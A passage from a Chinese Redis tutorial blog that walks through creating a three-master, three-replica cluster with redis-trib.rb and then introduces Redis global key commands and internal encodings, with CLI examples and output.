documentation for redis after 1 seconds</span><br><span class="line">1 gem installed</span><br></pre></td></tr></table></figure>

<h5 id="（3）拷贝-redis-trib-rb-到集群根目录"><a href="#（3）拷贝-redis-trib-rb-到集群根目录" class="headerlink" title="（3）拷贝 redis-trib.rb 到集群根目录"></a>（3）拷贝 redis-trib.rb 到集群根目录</h5><p>redis-trib.rb 是 redis 官方推出的管理 redis 集群 的工具，集成在 redis 的源码 src 目录下，将基于 redis 提供的 集群命令 封装成 简单、便捷、实用 的 操作工具。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/src/redis-trib.rb /usr/<span class="built_in">local</span>/redis-cluster</span></span><br></pre></td></tr></table></figure>

<p>查看 redis-trib.rb 命令环境是否正确，输出如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./redis-trib.rb </span></span><br><span class="line">Usage: redis-trib &lt;command&gt; &lt;options&gt; &lt;arguments ...&gt;</span><br><span class="line"></span><br><span class="line">  create          host1:port1 ... hostN:portN</span><br><span class="line">                  --replicas &lt;arg&gt;</span><br><span class="line">  check           host:port</span><br><span class="line">  info            host:port</span><br><span class="line">  fix             host:port</span><br><span class="line">                  --timeout &lt;arg&gt;</span><br><span class="line">  reshard         host:port</span><br><span class="line">                  --from &lt;arg&gt;</span><br><span class="line">                  --to &lt;arg&gt;</span><br><span class="line">                  --slots &lt;arg&gt;</span><br><span class="line">                  --yes</span><br><span class="line">                  --timeout &lt;arg&gt;</span><br><span class="line">                  --pipeline &lt;arg&gt;</span><br><span class="line">  rebalance       host:port</span><br><span class="line">                  --weight &lt;arg&gt;</span><br><span class="line">                  --auto-weights</span><br><span class="line">                  --use-empty-masters</span><br><span class="line">                  --timeout &lt;arg&gt;</span><br><span class="line">                  --simulate</span><br><span class="line">                  --pipeline &lt;arg&gt;</span><br><span class="line">                  --threshold &lt;arg&gt;</span><br><span class="line">  add-node        new_host:new_port existing_host:existing_port</span><br><span class="line">                  --slave</span><br><span class="line">                  --master-id &lt;arg&gt;</span><br><span class="line">  del-node        host:port node_id</span><br><span class="line">  set-timeout     host:port milliseconds</span><br><span class="line">  call            host:port command arg arg .. arg</span><br><span class="line">  import          host:port</span><br><span class="line">                  --from &lt;arg&gt;</span><br><span class="line">                  --copy</span><br><span class="line">                  --replace</span><br><span class="line">  help            (show this help)</span><br><span class="line"></span><br><span class="line">For check, fix, reshard, del-node, set-timeout you can specify the host and port of any working node in the cluster.</span><br></pre></td></tr></table></figure>

<p>redis-trib.rb 是 redis 作者用 ruby 完成的。redis-trib.rb 命令行工具 的具体功能如下：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>create</code></td>
<td>创建集群</td>
</tr>
<tr>
<td><code>check</code></td>
<td>检查集群</td>
</tr>
<tr>
<td><code>info</code></td>
<td>查看集群信息</td>
</tr>
<tr>
<td><code>fix</code></td>
<td>修复集群</td>
</tr>
<tr>
<td><code>reshard</code></td>
<td>在线迁移 slot</td>
</tr>
<tr>
<td><code>rebalance</code></td>
<td>平衡集群节点 slot 数量</td>
</tr>
<tr>
<td><code>add-node</code></td>
<td>将新节点加入集群</td>
</tr>
<tr>
<td><code>del-node</code></td>
<td>从集群中删除节点</td>
</tr>
<tr>
<td><code>set-timeout</code></td>
<td>设置集群节点间心跳连接的超时时间</td>
</tr>
<tr>
<td><code>call</code></td>
<td>在集群全部节点上执行命令</td>
</tr>
<tr>
<td><code>import</code></td>
<td>将外部 redis 数据导入集群</td>
</tr>
</tbody></table>
<h4 id="3、安装集群"><a href="#3、安装集群" class="headerlink" title="3、安装集群"></a>3、安装集群</h4><h5 id="（1）启动-redis-服务节点"><a href="#（1）启动-redis-服务节点" class="headerlink" title="（1）启动 redis 服务节点"></a>（1）启动 redis 服务节点</h5><p>运行如下命令启动 6 台 redis 节点：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo redis-server conf/redis-6379.conf</span><br><span class="line">sudo redis-server conf/redis-6389.conf</span><br><span class="line">sudo redis-server conf/redis-6380.conf</span><br><span class="line">sudo redis-server conf/redis-6390.conf</span><br><span class="line">sudo redis-server conf/redis-6381.conf</span><br><span class="line">sudo redis-server conf/redis-6391.conf</span><br></pre></td></tr></table></figure>

<p>启动完成后，redis 以集群模式启动，查看各个 redis 节点的进程状态：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ef | grep redis-server</span></span><br><span class="line">    0  1908     1   0  4:59下午 ??         0:00.01 redis-server *:6379 [cluster] </span><br><span class="line">    0  1911     1   0  4:59下午 ??         0:00.01 redis-server *:6389 [cluster] </span><br><span class="line">    0  1914     1   0  4:59下午 ??         0:00.01 redis-server *:6380 [cluster] </span><br><span class="line">    0  1917     1   0  4:59下午 ??         0:00.01 redis-server *:6390 [cluster] </span><br><span class="line">    0  1920     1   0  4:59下午 ??         0:00.01 redis-server *:6381 [cluster] </span><br><span class="line">    0  1923     1   0  4:59下午 ??         0:00.01 redis-server *:6391 [cluster]</span><br></pre></td></tr></table></figure>

<p>在每个 redis 节点的 redis.conf 文件中，我们都配置了 <code>cluster-config-file</code> 的文件路径，集群启动时，conf 目录会新生成 集群 节点配置文件。查看文件列表如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree -L 3 .</span></span><br><span class="line">.</span><br><span class="line">├── appendonly.aof</span><br><span class="line">├── conf</span><br><span class="line">│   ├── node-6379.conf</span><br><span class="line">│   ├── node-6380.conf</span><br><span class="line">│   ├── node-6381.conf</span><br><span class="line">│   ├── node-6389.conf</span><br><span class="line">│   ├── node-6390.conf</span><br><span class="line">│   ├── node-6391.conf</span><br><span class="line">│   ├── redis-6379.conf</span><br><span class="line">│   ├── redis-6380.conf</span><br><span class="line">│   ├── redis-6381.conf</span><br><span class="line">│   ├── redis-6389.conf</span><br><span class="line">│   ├── redis-6390.conf</span><br><span class="line">│   └── redis-6391.conf</span><br><span class="line">├── data</span><br><span class="line">│   ├── redis-6379</span><br><span class="line">│   ├── redis-6380</span><br><span class="line">│   ├── redis-6381</span><br><span class="line">│   ├── redis-6389</span><br><span class="line">│   ├── redis-6390</span><br><span class="line">│   └── redis-6391</span><br><span class="line">├── log</span><br><span class="line">│   ├── redis-6379.log</span><br><span class="line">│   ├── redis-6380.log</span><br><span class="line">│   ├── redis-6381.log</span><br><span class="line">│   ├── redis-6389.log</span><br><span class="line">│   ├── redis-6390.log</span><br><span class="line">│   └── redis-6391.log</span><br><span class="line">└── redis-trib.rb</span><br><span class="line"></span><br><span class="line">9 directories, 20 files</span><br></pre></td></tr></table></figure>

<h5 id="（2）redis-trib-关联集群节点"><a href="#（2）redis-trib-关联集群节点" class="headerlink" title="（2）redis-trib 关联集群节点"></a>（2）redis-trib 关联集群节点</h5><p>按照 从主到从 的方式 从左到右 依次排列 6 个 redis 节点。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./redis-trib.rb create --replicas 1 127.0.0.1:6379 127.0.0.1:6380 127.0.0.1:6381 127.0.0.1:6389 127.0.0.1:6390 127.0.0.1:6391</span></span><br></pre></td></tr></table></figure>

<p>集群创建后，redis-trib 会先将 16384 个 哈希槽 分配到 3 个 主节点，即 redis-6379，redis-6380 和 redis-6381。然后将各个 从节点 指向 主节点，进行 数据同步。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Creating cluster</span><br><span class="line">&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...</span><br><span class="line">Using 3 masters:</span><br><span class="line">127.0.0.1:6379</span><br><span class="line">127.0.0.1:6380</span><br><span class="line">127.0.0.1:6381</span><br><span class="line">Adding replica 127.0.0.1:6390 to 127.0.0.1:6379</span><br><span class="line">Adding replica 127.0.0.1:6391 to 127.0.0.1:6380</span><br><span class="line">Adding replica 127.0.0.1:6389 to 127.0.0.1:6381</span><br><span class="line">&gt;&gt;&gt; Trying to optimize slaves allocation for anti-affinity</span><br><span class="line">[WARNING] Some slaves are in the same host as their master</span><br><span class="line">M: ad4b9ffceba062492ed67ab336657426f55874b7 127.0.0.1:6379</span><br><span class="line">   slots:0-5460 (5461 slots) master</span><br><span class="line">M: df23c6cad0654ba83f0422e352a81ecee822702e 127.0.0.1:6380</span><br><span class="line">   slots:5461-10922 (5462 slots) master</span><br><span class="line">M: ab9da92d37125f24fe60f1f33688b4f8644612ee 127.0.0.1:6381</span><br><span class="line">   slots:10923-16383 (5461 slots) master</span><br><span class="line">S: 25cfa11a2b4666021da5380ff332b80dbda97208 127.0.0.1:6389</span><br><span class="line">   replicates ad4b9ffceba062492ed67ab336657426f55874b7</span><br><span class="line">S: 48e0a4b539867e01c66172415d94d748933be173 127.0.0.1:6390</span><br><span class="line">   replicates df23c6cad0654ba83f0422e352a81ecee822702e</span><br><span class="line">S: d881142a8307f89ba51835734b27cb309a0fe855 127.0.0.1:6391</span><br><span class="line">   replicates ab9da92d37125f24fe60f1f33688b4f8644612ee</span><br></pre></td></tr></table></figure>

<p>然后输入 <code>yes</code> ，<code>redis-trib.rb</code> 开始执行 节点握手 和 槽分配 操作，输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Can I set the above configuration? (type &apos;yes&apos; to accept): yes</span><br><span class="line">&gt;&gt;&gt; Nodes configuration updated</span><br><span class="line">&gt;&gt;&gt; Assign a different config epoch to each node</span><br><span class="line">&gt;&gt;&gt; Sending CLUSTER MEET messages to join the cluster</span><br><span class="line">Waiting for the cluster to join....</span><br><span class="line">&gt;&gt;&gt; Performing Cluster Check (using node 127.0.0.1:6379)</span><br><span class="line">M: ad4b9ffceba062492ed67ab336657426f55874b7 127.0.0.1:6379</span><br><span class="line">   slots:0-5460 (5461 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">M: ab9da92d37125f24fe60f1f33688b4f8644612ee 127.0.0.1:6381</span><br><span class="line">   slots:10923-16383 (5461 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">S: 48e0a4b539867e01c66172415d94d748933be173 127.0.0.1:6390</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates df23c6cad0654ba83f0422e352a81ecee822702e</span><br><span class="line">S: d881142a8307f89ba51835734b27cb309a0fe855 127.0.0.1:6391</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates ab9da92d37125f24fe60f1f33688b4f8644612ee</span><br><span class="line">M: df23c6cad0654ba83f0422e352a81ecee822702e 127.0.0.1:6380</span><br><span class="line">   slots:5461-10922 (5462 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">S: 25cfa11a2b4666021da5380ff332b80dbda97208 127.0.0.1:6389</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates ad4b9ffceba062492ed67ab336657426f55874b7</span><br><span class="line">[OK] All nodes agree about slots configuration.</span><br><span class="line">&gt;&gt;&gt; Check for open slots...</span><br><span class="line">&gt;&gt;&gt; Check slots coverage...</span><br><span class="line">[OK] All 16384 slots covered.</span><br></pre></td></tr></table></figure>

<p>执行 集群检查，检查各个 redis 节点占用的 哈希槽（slot）的个数以及 slot 覆盖率。16384 个槽位中，主节点 redis-6379、redis-6380 和 redis-6381 分别占用了 5461、5461 和 5462 个槽位。</p>
<h5 id="（3）redis-主节点的日志"><a href="#（3）redis-主节点的日志" class="headerlink" title="（3）redis 主节点的日志"></a>（3）redis 主节点的日志</h5><p>可以发现，通过 <code>BGSAVE</code> 命令，从节点 redis-6389 在 后台 异步地从 主节点 redis-6379 同步数据。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat <span class="built_in">log</span>/redis-6379.log </span></span><br><span class="line">1907:C 05 Sep 16:59:52.960 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">1907:C 05 Sep 16:59:52.961 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=1907, just started</span><br><span class="line">1907:C 05 Sep 16:59:52.961 # Configuration loaded</span><br><span class="line">1908:M 05 Sep 16:59:52.964 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">1908:M 05 Sep 16:59:52.965 * No cluster configuration found, I'm ad4b9ffceba062492ed67ab336657426f55874b7</span><br><span class="line">1908:M 05 Sep 16:59:52.967 * Running mode=cluster, port=6379.</span><br><span class="line">1908:M 05 Sep 16:59:52.967 # Server initialized</span><br><span class="line">1908:M 05 Sep 16:59:52.967 * Ready to accept connections</span><br><span class="line">1908:M 05 Sep 17:01:17.782 # configEpoch set to 1 via CLUSTER SET-CONFIG-EPOCH</span><br><span class="line">1908:M 05 Sep 17:01:17.812 # IP address for this node updated to 127.0.0.1</span><br><span class="line">1908:M 05 Sep 17:01:22.740 # Cluster state changed: ok</span><br><span class="line">1908:M 05 Sep 17:01:23.681 * Slave 127.0.0.1:6389 asks for synchronization</span><br><span class="line">1908:M 05 Sep 17:01:23.681 * Partial resynchronization not accepted: Replication ID mismatch (Slave asked for '4c5afe96cac51cde56039f96383ea7217ef2af41', my replication IDs are '037b661bf48c80c577d1fa937ba55367a3692921' and '0000000000000000000000000000000000000000')</span><br><span class="line">1908:M 05 Sep 17:01:23.681 * Starting BGSAVE for SYNC with target: disk</span><br><span class="line">1908:M 05 Sep 17:01:23.682 * Background saving started by pid 1952</span><br><span class="line">1952:C 05 Sep 17:01:23.683 * DB saved on disk</span><br><span class="line">1908:M 05 Sep 17:01:23.749 * Background saving terminated with success</span><br><span class="line">1908:M 05 Sep 17:01:23.752 * Synchronization with slave 127.0.0.1:6389 succeeded</span><br></pre></td></tr></table></figure>

<h5 id="（4）redis-集群完整性检测"><a href="#（4）redis-集群完整性检测" class="headerlink" title="（4）redis 集群完整性检测"></a>（4）redis 集群完整性检测</h5><p>使用 <code>redis-trib.rb check</code> 命令检测之前创建的 两个集群 是否成功，<code>check</code> 命令只需要给出集群中 任意一个节点地址 就可以完成 整个集群 的 检查工作，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./redis-trib.rb check 127.0.0.1:6379</span></span><br></pre></td></tr></table></figure>

<p>当最后输出如下信息，提示集群 所有的槽 都已分配到节点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[OK] All nodes agree about slots configuration.</span><br><span class="line">&gt;&gt;&gt; Check for open slots...</span><br><span class="line">&gt;&gt;&gt; Check slots coverage...</span><br><span class="line">[OK] All 16384 slots covered.</span><br></pre></td></tr></table></figure>

<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了 Redis 集群解决方案，数据分布 和 集群搭建。集群方案包括 客户端分区 方案，代理分区 方案 和 查询路由 方案。数据分布 部分简单地对 节点取余 分区，一致性哈希 分区以及 虚拟槽 分区进行了阐述和对比。最后对使用 <code>Redis-trib</code> 搭建了一个 三主三从 的 虚拟槽 集群示例。</p>
<hr>
<h1 id="数据结构与全局命令概述"><a href="#数据结构与全局命令概述" class="headerlink" title="数据结构与全局命令概述"></a>数据结构与全局命令概述</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>Redis 提供了 5 种数据结构。理解每种数据结构的特点，对于 Redis 的 开发运维 非常重要，同时掌握 Redis 的 单线程命令处理 机制，会使 数据结构 和 命令 的选择事半功倍。  </p>
<p>接下来的几篇文章，将从如下几个方面介绍 Redis 的几种数据结构，命令使用及其应用场景。</p>
<ul>
<li>预备知识：几个简单的 全局命令，数据结构 和 内部编码，单线程命令 处理机制分析。</li>
<li>数据结构特性：5 种 数据结构 的特点、命令使用、应用场景。</li>
<li>数据管理：键管理、遍历键、数据库管理。</li>
</ul>
<h2 id="正文-3"><a href="#正文-3" class="headerlink" title="正文"></a>正文</h2><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>在介绍 5 种 数据结构 之前，需要先了解 Redis 的一些 全局命令、数据结构 和 内部编码、单线程命令处理机制。</p>
<ol>
<li>Redis 的命令有 上百个，理解 Redis 的一些机制，会发现这些命令有很强的 通用性。</li>
<li>Redis 不是万金油，有些 数据结构 和 命令 必须在 特定场景 下使用，一旦 使用不当 可能对 Redis 本身 或者 应用本身 造成致命伤害。</li>
</ol>
<h3 id="全局命令"><a href="#全局命令" class="headerlink" title="全局命令"></a>全局命令</h3><p>Redis 有 5 种 数据结构，它们是 键值对 中的 值，对于 键 来说有一些通用的命令。</p>
<h4 id="查看所有键"><a href="#查看所有键" class="headerlink" title="查看所有键"></a>查看所有键</h4><blockquote>
<p><code>keys *</code></p>
</blockquote>
<p>下面插入了 3 对字符串类型的键值对：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> hello world</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> java jedis</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> python redis-py</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>命令会将所有的键输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">"python"</span></span><br><span class="line">2) <span class="string">"java"</span></span><br><span class="line">3) <span class="string">"hello"</span></span><br></pre></td></tr></table></figure>

<h4 id="键总数"><a href="#键总数" class="headerlink" title="键总数"></a>键总数</h4><blockquote>
<p><code>dbsize</code></p>
</blockquote>
<p>下面插入一个 列表类型 的 键值对（值是 多个元素 组成）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; rpush mylist a b c d e f g</span><br><span class="line">(<span class="built_in">integer</span>) 7</span><br></pre></td></tr></table></figure>

<p><code>dbsize</code> 命令会返回当前数据库中 键的总数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; dbsize</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br></pre></td></tr></table></figure>

<p><code>dbsize</code> 命令在 计算键总数 时 不会遍历 所有键，而是直接获取 Redis 内置的键总数变量，所以 <code>dbsize</code> 命令的 时间复杂度 是 O（1）。而 <code>keys</code> 命令会 遍历 所有键，所以它的 时间复杂度 是 O（n），当 Redis 保存了 大量键 时，线上环境 禁止 使用。</p>
<h4 id="检查键是否存在"><a href="#检查键是否存在" class="headerlink" title="检查键是否存在"></a>检查键是否存在</h4><blockquote>
<p><code>exists key</code></p>
</blockquote>
<p>如果键存在则返回 1，不存在则返回 0：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; exists java</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; exists not_exist_key</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<h4 id="删除键"><a href="#删除键" class="headerlink" title="删除键"></a>删除键</h4><blockquote>
<p><code>del key</code></p>
</blockquote>
<p><code>del</code> 是一个 通用命令，无论值是什么 数据结构 类型，<code>del</code> 命令都可以将其 删除。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; del java</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; exists java</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; del not_exist_key</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; exists not_exist_key</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<p>返回结果为 成功删除 的 键的个数，假设删除一个 不存在 的键，就会返回 0。</p>
<h4 id="键过期"><a href="#键过期" class="headerlink" title="键过期"></a>键过期</h4><blockquote>
<p><code>expire key seconds</code></p>
</blockquote>
<p>Redis 支持对 键 添加 过期时间，当超过过期时间后，会 自动删除键，例如为键 hello 设置 10 秒过期时间：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> hello world</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; expire hello 10 </span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<p><code>ttl</code> 命令会返回键的 剩余过期时间，它有 3 种返回值：</p>
<ul>
<li><strong>大于等于 0 的整数</strong>：表示键 剩余 的 过期时间。</li>
<li>返回 <strong>-1</strong>：键 没设置 过期时间。</li>
<li>返回 <strong>-2</strong>：键 不存在。</li>
</ul>
<p>可以通过 <code>ttl</code> 命令观察 键 hello 的 剩余过期时间：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还剩7秒</span></span><br><span class="line">127.0.0.1:6379&gt; ttl hello(<span class="built_in">integer</span>) </span><br><span class="line">(<span class="built_in">integer</span>) 7</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 还剩1秒</span></span><br><span class="line">127.0.0.1:6379&gt; ttl hello(<span class="built_in">integer</span>) </span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line"><span class="comment"># 返回结果为-2，说明键hello已经被删除</span></span><br><span class="line">127.0.0.1:6379&gt; ttl hello(<span class="built_in">integer</span>) </span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379&gt; get hello</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<h4 id="键的数据结构类型"><a href="#键的数据结构类型" class="headerlink" title="键的数据结构类型"></a>键的数据结构类型</h4><blockquote>
<p><code>type key</code></p>
</blockquote>
<p>例如键 hello 是的值 字符串类型，返回结果为 string。键 mylist 的值是 列表类型，返回结果为 list。如果键不存在，则返回 none。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> a b</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">type</span> a</span><br><span class="line">string</span><br><span class="line">127.0.0.1:6379&gt; rpush mylist a b c d e f g</span><br><span class="line">(<span class="built_in">integer</span>) 7</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">type</span> mylist</span><br><span class="line">list</span><br></pre></td></tr></table></figure>

<h3 id="数据结构和内部编码"><a href="#数据结构和内部编码" class="headerlink" title="数据结构和内部编码"></a>数据结构和内部编码</h3><p><code>type</code> 命令实际返回的就是当前 键 的 数据结构类型，它们分别是：string（字符串）、hash（哈希）、list（列表）、set（集合）、zset（有序集合），但这些只是 Redis 对外的 数据结构。如图所示：</p>
<figure class="image-box">
                <img src="165f79470dff7693.png" alt title class>
                <p></p>
            </figure>

<p>对于每种 数据结构，实际上都有自己底层的 内部编码 实现，而且是 多种实现。这样 Redis 会在合适的 场景 选择合适的 内部编码，如图所示：</p>
<figure class="image-box">
                <img src="165f79470e44f30b.png" alt title class>
                <p></p>
            </figure>

<p>可以看到，每种 数据结构 都有 两种以上 的 内部编码实现。例如 list 数据结构 包含了 linkedlist 和 ziplist 两种 内部编码。同时有些 内部编码，例如 ziplist，可以作为 多种外部数据结构 的内部实现，可以通过 <code>object encoding</code> 命令查询 内部编码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; object encoding hello</span><br><span class="line"><span class="string">"embstr"</span></span><br><span class="line">127.0.0.1:6379&gt; object encoding mylist</span><br><span class="line"><span class="string">"quicklist"</span></span><br></pre></td></tr></table></figure>

<p>可以看到键 hello 对应值的 内部编码 是 embstr，键 mylist 对应值的 内部编码 是 ziplist。  </p>
<p>Redis 这样设计有两个好处：</p>
<ul>
<li>其一：可以改进 内部编码，而对外的 数据结构 和 命令 没有影响。例如 Redis3.2 提供的 quicklist，结合了 ziplist 和 linkedlist 两者的优势，为 列表类型 提供了一种 更加高效 的 内部编码实现。</li>
